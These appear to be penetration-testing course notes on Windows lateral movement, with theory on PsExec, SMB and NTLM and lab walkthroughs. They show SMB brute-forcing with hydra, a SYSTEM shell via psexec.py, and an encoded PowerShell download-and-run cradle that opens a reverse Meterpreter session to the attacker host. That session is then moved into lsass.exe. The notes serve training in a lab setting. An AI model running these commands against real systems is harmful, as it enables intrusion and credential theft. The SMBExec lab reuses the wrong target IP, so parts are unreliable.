# Lateral Movement and Pivoting

## Course Introduction

### Course Topic Overview

- Introduction to Lateral Movement and Pivoting
- Windows Lateral Movement
	- Windows Lateral Movement Techniques
	- Windows Lateral Movement with PsExec
	- Windows Lateral Movement with SMBExec
	- Windows Lateral Movement with CrackMapExec
	- Windows Lateral Movement via RDP
	- Windows Lateral Movement via WinRM
	- Windows Lateral Movement with Metasploit
	- Windows Lateral Movement with WMIExec
- Linux Lateral Movement
	- Linux Lateral Movement Techniques
- Pivoting
	- Pivoting and Port Forwarding with Metasploit
	- Pivoting with SOCKS Proxy
	- Pivoting via SSH Tunneling
	- Pivoting with reGeorg
- Linux Lateral Movement and Pivoting
	- Linux Lateral Movement and Pivoting: Black-Box Penetration Test (with SOCKS Proxy, SSH Tunneling, Metasploit)

### Prerequisites

- **Basic Understanding of Computer Networking**
	- Knowledge of IP addresses, subnetting, routing, and network devices (switches, routers, firewalls).
	- Familiarity with common network protocols (TCP, UDP, HTTP, DNS, etc.).
- **Fundamentals of Operating Systems**
	- Basic knowledge of Windows and Linux operating systems, including their command-line interfaces.
	- Understanding of system processes, file systems, and user permissions.
- **Introductory Knowledge of Cybersecurity Concepts**
	- Awareness of common cybersecurity threats (e.g., phishing, malware, brute-force attacks).
	- Familiarity with the principles of information security (confidentiality, integrity, availability).
- **Experience with Penetration Testing Tools**
	- Some experience using common penetration testing tools (e.g., Metasploit, Nmap, Wireshark).
	- Understanding of basic penetration testing methodologies and techniques.

### Learning Objectives

1. **Understanding Lateral Movement and Pivoting**
	- Define and differentiate between lateral movement and pivoting in the context of penetration testing.
	- Explain the importance and impact of these techniques in penetration testing and red team operations.
2. **Lateral Movement**
	- List and describe common lateral movement techniques that can be performed in Windows and Linux environments.
	- Demonstrate competency in the use of various tools and techniques for lateral movement in Windows and Linux environments.
	- Leverage techniques and tools like PsExec, WMI, SSH, RDP, and others to move laterally within Windows and Linux environment.
3. **Pivoting**
	- Describe how pivoting works and why it's used in red team engagements.
	- Demonstrate competency in using various tools and techniques for network pivoting, including SSH tunneling, VPNs, and SOCKS proxies.
	- Leverage pivoting techniques to access different network segments.
	- Implement multi-hop pivots to navigate complex network topologies Detect and Mitigate Lateral Movement and Pivoting.

---
---

## Introduction to Lateral Movement and Pivoting

### Introduction to Lateral Movement and Pivoting - Theory

#### Lateral Movement

Lateral movement refers to the process of moving from one compromised system to other systems within a network.

Penetration testers and red teamers utilize this technique to explore and access additional systems, typically aiming to reach high-value targets or sensitive data.

The primary goal of lateral movement is to escalate access and privileges, effectively broadening the attacker's control within the network. To do this, attackers exploit vulnerabilities, use compromised credentials, or exploit misconfigurations to gain entry into additional systems.

Methods of lateral movement include exploiting vulnerabilities in network services, credential dumping to impersonate users, abusing shared resources, or leveraging various forms of remote access (like RDP, SSH, or WMI).

Why? Let's assume you are on an internal Windows network and you've recovered some valid local/domain credentials. Now what do you actually do with these credentials?

This is where lateral movement comes in to play, you use these credentials to authenticate to target systems through various remote authentication protocols like SMB, RDP, etc.

#### Pivoting

Pivoting, while often used interchangeably with lateral movement, has a more specific meaning.

It involves using a compromised system as a "stepping stone" to access other systems or network segments that are otherwise inaccessible from the attacker's initial entry point.

Pivoting is common when attacking segmented networks or when an initial entry point is in a less-secure zone, but the target is in a more secure area.

By pivoting, attackers can leverage the compromised system's network connections or resources to reach additional systems or networks.

Techniques for pivoting include setting up port forwarding, using SSH tunnels, exploiting VPNs or other network bridging methods, or configuring proxy servers on the compromised host.

![Pivoting Visualized](./assets/08_lateral_movement_and_pivoting_pivoting.png)

#### Differences Between Lateral Movement and Pivoting

| **SCOPE** | **Lateral Movement** | **Pivoting** |
|-----------|----------------------|--------------|
| **Scope** | Lateral movement generally refers to moving within the same network or network segment, targeting adjacent or nearby systems. | Pivoting, on the other hand, typically involves using a compromised system to access other network segments or more restricted areas. |
| **APPROACH** | Lateral movement often relies on methods like exploiting common vulnerabilities, using shared resources, or credential-based attacks within a network. | Pivoting usually involves more complex network-routing techniques to gain access to isolated or segmented networks. |
| **OBJECTIVE** | Lateral movement is often focused on escalating privileges or access within a network. | Pivoting is aimed at bypassing network boundaries or accessing different network segments. |

---

## Windows Lateral Movement

### Windows Lateral Movement Techniques - Theory/Lab

#### Windows Lateral Movement Techniques

Windows lateral movement techniques encompass a range of strategies and methods that attackers use to move laterally within a network, gaining access to additional systems or resources.

Here is an outline of the various Windows lateral movement techniques, along with common tools or utilities that can be used to execute them.

##### Credential-Based Lateral Movement

Credential-based lateral movement refers to techniques attackers use to move laterally within a network by obtaining, reusing, or exploiting credentials.
Credentials can be usernames and passwords, cryptographic hashes, or Kerberos tickets.
Once attackers have these credentials, they can access other systems, typically without needing additional exploitation or vulnerabilities.
This form of lateral movement is particularly dangerous because it relies on valid credentials, which can make it difficult to detect and often mimics legitimate user behavior.

**Pass-the-Hash (PtH)**
Attackers use stolen NTLM hash values to authenticate with other systems without knowing the plaintext password.
Tools: Mimikatz, Metasploit, Impacket (e.g., psexec.py), CrackMapExec.

**Pass-the-Ticket (PtT)**
Attackers use captured Kerberos tickets to authenticate and access resources across a network.
Tools: Mimikatz, Rubeus, Kerberos exploitation tools.

**Credential Reuse**
Attackers use captured plaintext passwords or hashes to gain access to additional systems.
Tools: Mimikatz, Metasploit, CrackMapExec, Impacket.

**Golden/Silver Tickets**
Attackers forge Kerberos tickets to gain long-term or specific access to domain resources.
Tools: Mimikatz, Rubeus.

##### Windows Remote Management Protocols

Remote management protocols play a significant role in Windows administration, allowing administrators to manage systems remotely, troubleshoot, and execute scripts.
However, these protocols also present opportunities for attackers to move laterally within a network once they've compromised a system or obtained valid credentials.

**Protocol Overview**

| **Protocol**                         | **Description**                                                                                                                                                  | **Ports**                    | **Attack Methods**                                                                                                                                                             |
|--------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------|------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Windows Remote Management (WinRM)** | WinRM is Microsoft's implementation of the WS-Management protocol, allowing remote management and command execution on Windows systems.                           | Typically operates on ports 5985 (HTTP) and 5986 (HTTPS).    | Attackers can use valid credentials to access WinRM and execute remote PowerShell commands or scripts. Tools like PowerShell remoting, Invoke-Command, and Impacket's smbexec.py can exploit WinRM for lateral movement.  |
| **Remote Desktop Protocol (RDP)**    | RDP provides a graphical interface for remote access to Windows systems. It is widely used by administrators for remote control and management.                   | Default port is 3389/TCP      | Attackers with valid RDP credentials or who can bypass security controls (like Network Level Authentication) can use RDP for lateral movement. Attackers might also use RDP brute-force attacks to gain access.          |
| **Windows Management Instrumentation (WMI)** | WMI is a framework for managing Windows systems, allowing remote administration, data collection, and remote command execution.                                   |                              | Attackers can use WMI to execute commands on remote systems, gathering information or performing lateral movement. Tools like Impacket's wmiexec.py, PowerShell, and Metasploit's WMI modules are often used to exploit WMI for remote execution. |
| **Server Message Block (SMB)**       | SMB is a network protocol for file sharing, printer sharing, and inter-process communication. It is also used for various remote management functions.            | Default ports are 445 and 139 | Attackers might use SMB to deploy tools like PsExec for remote code execution, or use tools like CrackMapExec and Impacket's psexec.py to gain remote access and move laterally.                                     |

##### Authenticated Remote Code Execution

Remote execution techniques for lateral movement involve running commands or code on a remote system, allowing attackers to move laterally across a network.
These techniques are critical to understand in penetration testing, incident response, and cybersecurity as they enable attackers to access additional systems and potentially escalate privileges.
Remote execution techniques can be based on a variety of methods, such as using network protocols, remote management tools, or leveraging shared resources.

##### Authenticated RCE Techniques

**Remote Desktop Protocol (RDP)**
RDP allows a user to remotely connect to a Windows system with a graphical user interface. Attackers can use compromised credentials or brute force to gain access.
Attackers with valid RDP credentials can connect to remote systems and perform actions as if they were physically present.
Tools: xfreerdp, Metasploit modules for RDP, RDP brute force tools.

**Windows Management Instrumentation (WMI)**
WMI is a framework for managing and monitoring Windows systems. It allows remote execution of commands and scripts.
Attackers use WMI to run code or scripts on remote systems, often for reconnaissance or remote command execution.
Tools: PowerShell, Impacket (wmiexec.py), Metasploit modules.

**PowerShell Remoting**
PowerShell provides capabilities for remote administration and scripting. PowerShell remoting allows execution of commands on remote systems.
Attackers use PowerShell to execute scripts on other systems, potentially to install backdoors, exfiltrate data, or perform other malicious actions.
Tools: PowerShell (Invoke-Command, Enter-PSSession), Metasploit modules, Empire framework.

**PsExec and Similar Tools**
PsExec and similar tools (like psexec.py from Impacket) allow remote execution over SMB by creating a service on the target system to run commands.
Attackers can execute code remotely using these tools, often with elevated privileges, to move laterally across the network.
Tools: PsExec, Impacket (psexec.py), CrackMapExec.

### Windows Lateral Movement with PsExec - Theory

#### PsExec

Authenticated Windows lateral movement via SMB with PsExec refers to the process of using valid credentials to move laterally across a Windows network by remotely executing code on other systems via Server Message Block (SMB).

PsExec is a utility from the Sysinternals Suite that allows administrators to execute commands on remote systems. However, attackers can also use it for malicious purposes.

It is widely used by system administrators for remote management and troubleshooting. However, due to its capability to execute commands remotely with administrative privileges, PsExec has also become a popular tool for attackers to facilitate lateral movement in Windows networks.

##### How PsExec Works

1. **Connection Over SMB**
PsExec establishes a connection to a remote system using Server Message Block (SMB).
It typically requires credentials for authentication, either as plaintext passwords or NTLM hashes.

2. **Named Pipe**
PsExec creates a named pipe on the remote system to facilitate communication between the local PsExec client and the remote service.

3. **Temporary Service**
To execute commands on the remote system, PsExec creates a temporary Windows service.
This service runs with elevated privileges, allowing it to execute commands or scripts as a system administrator.

4. **Execution and Cleanup**
Once the command or script is executed, PsExec cleans up by removing the temporary service. However, traces like logs or artifacts may remain, providing a trail of activity.

#### PsExec - Permissions and Privileges

To authenticate via SMB and execute commands with PsExec, the user account must have appropriate permissions. Here's what this typically means:

**Administrative Privileges**

<u>PsExec typically requires administrative privileges</u> to function properly.
This means that the user account used to authenticate over SMB must have the rights to:
	- Create and start a service on the remote system.
	- Access the IPC$ share, which is used to establish the SMB connection.
	- Read and write to certain directories or system areas.
	- Local Users and Domain Users: PsExec can use both local and domain-based accounts to authenticate over SMB. In domain environments, users with administrative rights in Active Directory may have broader access to remote systems.

#### SMB

SMB (Server Message Block) is a network file sharing protocol that is used to facilitate the sharing of files and peripherals (printers and serial ports) between computers on a local network (LAN).

SMB uses port 445 (TCP). However, originally, SMB ran on top of NetBIOS using port 139.

SAMBA is the open source Linux implementation of SMB, and allows Windows systems to access Linux shares and devices.

##### SMB Authentication

The SMB protocol utilizes two levels of authentication, namely:
	- User Authentication
	- Share Authentication

**User authentication**: Users must provide a username and password in order to authenticate with the SMB server in order to access a share.

**Share authentication**: Users must provide a password in order to access restricted share.

*Note: Both of these authentication levels utilize a challenge-response authentication system.*

#### NTLM

NTLM (NT LAN Manager) is a legacy authentication protocol used in Microsoft Windows environments. Although it has been largely replaced by Kerberos in domain-based environments, NTLM is still used in various contexts, especially in environments with older systems or in specific use cases where Kerberos is not feasible.

Understanding how NTLM authentication works is critical, particularly in the context of Server Message Block (SMB), because it is often a target for attacks, such as Pass-the-Hash.

##### NTLM Authentication Process

NTLM authentication operates using a challenge-response mechanism.
Here's a breakdown of the NTLM authentication process in the context of SMB.

1. **Connection Request**
A client, such as a Windows system or an application, initiates a connection to an SMB server. This could be for accessing a shared folder, printer, or other SMB-based resources.

2. **Server Challenge**
The SMB server responds with an NTLM "challenge." This challenge is a random value used to ensure that the authentication process involves a unique component for each session.

3. **Client Response**
The client calculates a response to the server's challenge. This calculation involves encrypting the challenge using the NTLM hash derived from the user's password. This process ensures that the client has access to the correct NTLM hash without transmitting the plaintext password.
There are two key parts to the response:
  - **NTLMv1 Response**: Uses a DES-based mechanism to generate the response. It has been deprecated due to security weaknesses.
  - **NTLMv2 Response**: More secure, involving a combination of the server's challenge and a client challenge (a unique value generated by the client), providing additional security against replay attacks.

4. **Server Verification**
The server verifies the client's response by comparing it to the expected response, derived from its stored NTLM hashes.
If they match, the client is authenticated, allowing access to SMB resources.

![NTLM Authentication](./assets/08_lateral_movement_and_pivoting_ntlm_authentication.png)

#### SMB Authentication via PsExec

In order to utilize PsExec to gain access to a Windows target, we will need to identify legitimate user accounts and their respective passwords or password hashes.

This can be done by leveraging various tools and techniques, however, we also have the option to perform username enumeration and consequently password spraying.

We can narrow down our password spraying attack to only target common, ever-present local Windows user accounts like the Administrator, Admin, etc.

After we have obtained a legitimate user account and password, we can use the credentials to authenticate with the target system via PsExec and execute arbitrary system commands or obtain a reverse shell.

##### Impacket's Implementation of PsExec

Impacket is a collection of Python scripts and classes designed to interact with network protocols, particularly those used in Windows environments like SMB, DCOM, and others.

Impacket provides a Python implementation of PsExec (`psexec.py`), allowing Python-based tools to perform similar operations.

This script in Impacket mimics the functionality of PsExec, allowing remote execution of commands on Windows systems.

Here's how it typically works:
	- **SMB Connection**: `psexec.py` establishes a connection to the remote system using SMB. It uses valid credentials (plaintext or hashed) to authenticate.
	- **Creating a Named Pipe**: Once connected, the script creates a named pipe to communicate with the remote system.
	- **Installing a Service**: It installs a temporary service on the remote system to execute the desired command.
	- **Executing Commands**: The service executes the provided command or script, returning the output via the named pipe.
	- **Cleaning Up**: After execution, the script removes the temporary service to minimize traces.

#### Lateral Movement with PsExec

1. **Obtain Credentials**
Attackers acquire valid credentials through methods like credential dumping, phishing, or other means. These credentials may be plaintext passwords or NTLM hashes.

2. **Establish SMB Connection**
Using PsExec, the attacker establishes a connection to the target system over SMB. This typically involves providing a username and password, or NTLM hash.

3. **Remote Command Execution**
Once connected, PsExec creates a named pipe on the target system to communicate with the PsExec client.
It then creates a temporary Windows service to execute the desired commands, scripts, or programs.

#### References and Resources

- [**PsExec Documentation**](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec#introduction)
- [**NTLM User Authentication**](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/ntlm-user-authentication)
- [**Impacket’s Python implementation of PsExec**](https://github.com/fortra/impacket/blob/master/examples/psexec.py).

### Windows Lateral Movement with PsExec - Lab

#### Lab Environment

A Kali GUI machine and a target machine running a vulnerable SMB service are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (`/root/Desktop/target`). 

Your task is to fingerprint the SMB service using the tools available on the Kali machine and then use PSexec tool to perform a post-exploitation on the SMB service. The Psexec tool is useful to execute the commands directly on the remote systems via over a named pipe with the SMB service.

**Objective:** Exploit the SMB service to get a Meterpreter on the target and retrieve the flag!

Dictionaries to use:
	- `/usr/share/metasploit-framework/data/wordlists/common_users.txt`
	- `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`.

#### Lab Solution

<span style="color: #e57373;">**Attacker machine**</span>.

_Obtain the target machine's IP address from the provided file to perform subsequent operations on the correct target._

`cat /root/Desktop/target`:
```
Target IP Address : 10.4.27.105 ←
```

_Use the `ping` command to check connectivity to the target machine, ensuring that it is reachable and verifying network stability._

`ping -c 3 10.4.27.105`:
```
PING 10.4.27.105 (10.4.27.105) 56(84) bytes of data.
64 bytes from 10.4.27.105: icmp_seq=1 ttl=125 time=9.78 ms
64 bytes from 10.4.27.105: icmp_seq=2 ttl=125 time=8.48 ms
64 bytes from 10.4.27.105: icmp_seq=3 ttl=125 time=8.55 ms

--- 10.4.27.105 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms ←
rtt min/avg/max/mdev = 8.482/8.938/9.783/0.597 ms
```

_Use `nmap` to perform a comprehensive scan of the target machine, identifying all open ports and services. This will help in understanding the attack surface._

`nmap -Pn -sS -sV 10.4.27.105 -p-`:
```
Starting Nmap 7.70 ( https://nmap.org ) at 2024-08-20 15:27 IST
Nmap scan report for 10.4.27.105
Host is up (0.0086s latency).
Not shown: 65523 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn ←
445/tcp   open  microsoft-ds? ←
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.51 seconds
```

_Next, narrow down the focus to the SMB service on port 445 to enumerate supported SMB dialects, which will help in choosing the correct exploitation method._

`nmap --script smb-protocols 10.4.27.105 -p 445`:
```
Starting Nmap 7.70 ( https://nmap.org ) at 2024-08-20 15:29 IST
Nmap scan report for 10.4.27.105
Host is up (0.0087s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-protocols: ←
|   dialects: 
|     2.02
|     2.10
|     3.00
|     3.02
|_    3.11

Nmap done: 1 IP address (1 host up) scanned in 6.36 seconds
```

_Use `hydra`, a password-cracking tool, to brute-force SMB credentials using the specified dictionaries. This step is crucial for gaining access to the SMB service._

`hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.4.27.105 smb2`:
```
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-20 15:47:55
[WARNING] Workgroup was not specified, using "WORKGROUP"
[DATA] max 16 tasks per 1 server, overall 16 tasks, 7063 login tries (l:7/p:1009), ~442 tries per task
[DATA] attacking smb2://10.4.27.105:445/
[445][smb2] host: 10.4.27.105   login: sysadmin   password: princess ←
[445][smb2] host: 10.4.27.105   login: demo   password: bubbles
[445][smb2] host: 10.4.27.105   login: auditor   password: spongebob
[445][smb2] host: 10.4.27.105   login: administrator   password: superman ←
1 of 1 target successfully completed, 4 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-08-20 15:48:09
```

_Use the `psexec.py` script with the `sysadmin` credentials obtained from `hydra` to attempt to execute commands on the target machine remotely._

`psexec.py sysadmin:princess@10.4.27.105`:
```
Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.4.27.105.....
[-] share 'admin' is not writable. ←
[-] share 'ADMIN$' is not writable.
[-] share 'C' is not writable.
[-] share 'C$' is not writable.
[*] Found writable share public
[*] Uploading file bDrNAFdf.exe
[*] Opening SVCManager on 10.4.27.105.....
[-] Error opening SVCManager on 10.4.27.105..... ←
[-] Error performing the installation, cleaning up: Unable to open SVCManager
```

_The first attempt failed due to lack of permissions. Now try using the `administrator` credentials, which should have higher privileges._

`psexec.py administrator:superman@10.4.27.105`:
```
Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.4.27.105.....
[*] Found writable share admin ←
[*] Uploading file qCxGcTRY.exe ←
[*] Opening SVCManager on 10.4.27.105.....
[*] Creating service hBUD on 10.4.27.105..... ←
[*] Starting service hBUD.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
```

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Check the current user context on the target machine to confirm that the shell is running with `NT AUTHORITY\SYSTEM` privileges, indicating full control over the machine._

`whoami`:
```
nt authority\system ←
```

_Confirm the privileges of the `administrator` account, verifying that it is a member of the Administrators group, which grants complete control over the system._

`net localgroup Administrators`:
```
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator ←
The command completed successfully.
```

<span style="color: #e57373;">**Attacker machine**</span>.

_Check the network configuration on the attacker machine to set up the Metasploit listener on the correct interface (here, `eth1`)._

`ipconfig`:
```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.4  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:04  txqueuelen 0  (Ethernet)
        RX packets 11317  bytes 891122 (870.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10396  bytes 3926362 (3.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.46.4  netmask 255.255.255.0  broadcast 10.10.46.255 ←
        ether 02:42:0a:0a:2e:04  txqueuelen 0  (Ethernet)
        RX packets 132302  bytes 7270341 (6.9 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 133793  bytes 7968062 (7.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 52160  bytes 139259128 (132.8 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 52160  bytes 139259128 (132.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

_Set up and configure the Metasploit `web_delivery` module to generate a payload that can be executed on the target machine. The payload will create a Meterpreter session back to the attacker's machine._

`msfconsole -q`

`search web_delivery`, `use exploit/multi/script/web_delivery`, `set PAYLOAD windows/meterpreter/reverse_tcp`, `show options`, `set LHOST 10.10.46.4`, `set LPORT 4444`, `show targets`, `set TARGET PSH`, `exploit`:
```
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.46.4:4444 
[*] Using URL: http://0.0.0.0:8080/ZKJDq3Ypu
[*] Local IP: http://10.10.46.4:8080/ZKJDq3Ypu
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABVAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZ

...

AEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADQANgAuADQAOgA4ADAAOAAwAC8AWgBLAEoARABxADMAWQBwAHUAJwApACkAOwA=
```

**Explanation:** The Metasploit `web_delivery` module generates a payload that, when executed on the target, opens a Meterpreter session. This provides a powerful interface for post-exploitation activities.

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Execute the provided PowerShell command on the target machine, which will download and execute the payload generated by Metasploit, establishing a Meterpreter session back to the attacker._

```
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABVAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZ

...

AEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADQANgAuADQAOgA4ADAAOAAwAC8AWgBLAEoARABxADMAWQBwAHUAJwApACkAOwA=
```

<span style="color: #e57373;">**Attacker machine**</span>.

_Verify that the Meterpreter session has been successfully established, confirming control over the target machine._

```
[*] 10.4.27.105      web_delivery - Delivering AMSI Bypass (939 bytes)
[*] 10.4.27.105      web_delivery - Delivering Payload (1892 bytes)
[*] Sending stage (176195 bytes) to 10.4.27.105
[*] Meterpreter session 1 opened (10.10.46.4:4444 -> 10.4.27.105:49762) at 2024-08-20 15:37:55 +0530 ←
```

_List all active sessions in Metasploit and interact with the new Meterpreter session._

`sessions`, `sessions -i 1`

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Check the user context of the Meterpreter session to confirm that it is running with `NT AUTHORITY\SYSTEM` privileges._

`getuid`:
```
Server username: NT AUTHORITY\SYSTEM ←
```

_Migrate the Meterpreter process to `lsass.exe` to ensure persistence and stability of the session by attaching to a critical system process._

`migrate -N lsass.exe`:
```
[*] Migrating from 2996 to 696...
[*] Migration completed successfully. ←
```

_Use the shell command to search for files with the keyword `flag` and retrieve the contents to obtain the flag for the lab._

`shell`, `where /r C:\ ""*flag*"`:
```
C:\flag.txt ←
```

_Read the contents of the flag file to complete the objective._

`type C:\flag.txt`:
```
cce492688e30ea1eeaaa637df7e44eed ←
```

### Windows Lateral Movement with SMBExec - Theory

#### SMBExec

SMBExec is a tool used for remote command execution on Windows systems over the Server Message Block (SMB) protocol.

It is designed to allow administrators (or attackers) to execute commands on remote Windows machines, typically with administrative privileges, using SMB.

While similar in functionality to PsExec, SMBExec has certain distinctions that make it a unique tool in its own right.

##### Key Characteristics of SMBExec

**Remote Command Execution**
SMBExec allows users to execute commands or scripts on remote Windows systems over SMB.

**Authentication via SMB**
The tool connects to remote systems using SMB, typically requiring valid credentials for authentication.

**Does Not Create a Temporary Service**
Unlike PsExec, which creates a temporary Windows service to execute commands, SMBExec operates differently, often using Windows Management Instrumentation (WMI) or similar methods to achieve remote execution without creating additional services.

**Privilege Escalation and Lateral Movement**
SMBExec can be used for administrative tasks or, in a malicious context, for privilege escalation and lateral movement within a network.

### Windows Lateral Movement with SMBExec - Lab

#### Lab Environment

A Kali GUI machine and a target machine running a vulnerable SMB service are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (`/root/Desktop/target`). 

Your task is to fingerprint the SMB service using the tools available on the Kali machine and then use SMBExec tool to perform a post-exploitation on the SMB service. The SMBExec tool is useful to execute the commands without transferring any binary on the target server. It works with the SMB shares as well as without shares by running a local SMB server.

**Objective:** Exploit the SMB service to get a Meterpreter on the target and retrieve the flag!

Dictionaries to use:
	- `/usr/share/metasploit-framework/data/wordlists/common_users.txt`
	- `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`.

#### Lab Solution

<span style="color: #e57373;">**Attacker machine**</span>.

_Obtain the target machine's IP address from the provided file to perform subsequent operations on the correct target._

`cat /root/Desktop/target`:
```
Target IP Address : 10.4.28.143 ←
```

_Use the `ping` command to check connectivity to the target machine, ensuring that it is reachable and verifying network stability._

`ping -c 3 10.4.28.143`:
```
PING 10.4.28.143 (10.4.28.143) 56(84) bytes of data.
64 bytes from 10.4.28.143: icmp_seq=1 ttl=125 time=9.86 ms
64 bytes from 10.4.28.143: icmp_seq=2 ttl=125 time=9.12 ms
64 bytes from 10.4.28.143: icmp_seq=3 ttl=125 time=9.05 ms

--- 10.4.28.143 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms ←
rtt min/avg/max/mdev = 9.046/9.342/9.860/0.367 ms
```

_Use `nmap` to perform a thorough scan of the target machine, identifying all open ports and services to understand the attack surface._

`nmap -Pn -sS -sV 10.4.28.143 -p-`:
```
Starting Nmap 7.70 ( https://nmap.org ) at 2024-08-20 18:26 IST
Nmap scan report for 10.4.28.143
Host is up (0.0094s latency).
Not shown: 65523 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn ←
445/tcp   open  microsoft-ds? ←
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.60 seconds
```

_Refine the focus to the SMB service running on port 445 by enumerating supported SMB dialects to assist in selecting the correct exploitation technique._

`nmap --script smb-protocols 10.4.28.143 -p 445`:
```
Starting Nmap 7.70 ( https://nmap.org ) at 2024-08-20 18:27 IST
Nmap scan report for 10.4.28.143
Host is up (0.0092s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-protocols: ←
|   dialects: 
|     2.02
|     2.10
|     3.00
|     3.02
|_    3.11

Nmap done: 1 IP address (1 host up) scanned in 6.39 seconds
```

_Use `hydra`, a password-cracking tool, to brute-force SMB credentials using the specified dictionaries. This step is crucial for gaining access to the SMB service._

`hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.4.27.105 smb2`:
```
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

